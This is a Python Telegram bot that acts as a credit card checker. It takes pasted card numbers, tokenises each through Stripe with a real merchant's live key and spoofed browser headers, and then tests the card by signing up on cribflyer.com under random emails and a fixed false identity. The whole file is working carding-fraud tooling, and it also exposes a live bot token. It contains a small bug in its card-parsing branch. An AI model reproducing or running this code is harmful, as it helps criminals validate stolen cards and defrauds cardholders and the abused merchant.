import telebot
import requests
import time
import random
import string

API_TOKEN = '7634693376:AAGzz0nE7BfOR2XE7gyWGB6s4ycAL8pOUqY'
bot = telebot.TeleBot(API_TOKEN)

base_url = 'https://api.stripe.com/v1/payment_methods'
final_url = 'https://www.cribflyer.com/signup/api'

headers = {
    'accept': 'application/json',
    'accept-encoding': 'gzip, deflate, br, zstd',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36'
}

data = {
    'billing_details[name]': 'Peshang Salam',
    'billing_details[email]': '',
    'type': 'card',
    'card[number]': '',
    'card[cvc]': '',
    'card[exp_year]': '',
    'card[exp_month]': '',
    'allow_redisplay': 'unspecified',
    'pasted_fields': 'number',
    'payment_user_agent': 'stripe.js/c4c47a1722; stripe-js-v3/c4c47a1722; payment-element; deferred-intent',
    'referrer': 'https://www.cribflyer.com',
    'time_on_page': '54134',
    'client_attribution_metadata[client_session_id]': '61b2ec7c-b03f-463f-b50c-4f0a938d67df',
    'client_attribution_metadata[merchant_integration_source]': 'elements',
    'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
    'client_attribution_metadata[merchant_integration_version]': '2021',
    'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
    'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
    'guid': 'df1cb213-3b8d-40b5-861d-b78e6fbb086a883b59',
    'muid': '976d1b11-0e75-48a9-b082-7f34b6ed436aa8eae6',
    'sid': 'e8dd1e23-3b38-4655-951e-e66134f0153e810f76',
    'key': 'pk_live_QzBMW6gThdrTmOZ1k4lPJtSU'
}

final_data = {
    'email': '',
    'name': 'Peshang Salam',
    'firstname': 'Peshang',
    'lastname': 'Salam',
    'password': 'War112233$%',
    'confpassword': 'War112233$%',
    'product': 'property_plan',
    'qty': '1',
    'pmid': ''
}

def random_email():
    return ''.join(random.choices(string.ascii_lowercase, k=10)) + '@gmail.com'

def extract_card_info(card):
    parts = card.split('|') if '|' in card else card.split('/')
    if len(parts) == 4:
        return parts[0], parts[1], parts[2], parts[3]
    elif len(parts) == 3:
        return parts[0], parts[1], '20' + parts[2], parts[3]
    else:
        return None

def check_card(card):
    card_info = extract_card_info(card)
    if not card_info:
        return "Invalid card format."

    number, month, year, cvc = card_info
    data['billing_details[email]'] = random_email()
    data['card[number]'] = number
    data['card[cvc]'] = cvc
    data['card[exp_year]'] = year
    data['card[exp_month]'] = month

    response = requests.post(base_url, headers=headers, data=data)
    pm_id = response.json().get('id')

    if not pm_id:
        return response.json()

    final_data['email'] = random_email()
    final_data['pmid'] = pm_id

    final_response = requests.post(final_url, data=final_data)
    return final_response.json()

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "Please provide credit cards in the following formats:\nCC|MM|YY|CVV\nCC|MM|YYYY|CVV\nCC/MM/YY/CVV\nCC/MM/YYYY/CVV")

@bot.message_handler(commands=['stop'])
def stop_checking(message):
    bot.reply_to(message, "Stopping card checking process.")

@bot.message_handler(func=lambda message: True)
def echo_all(message):
    cards = message.text.split('\n')
    for card in cards:
        result = check_card(card.strip())
        bot.reply_to(message, f"Result for card {card.strip()}: {result}")
        time.sleep(15)

bot.polling()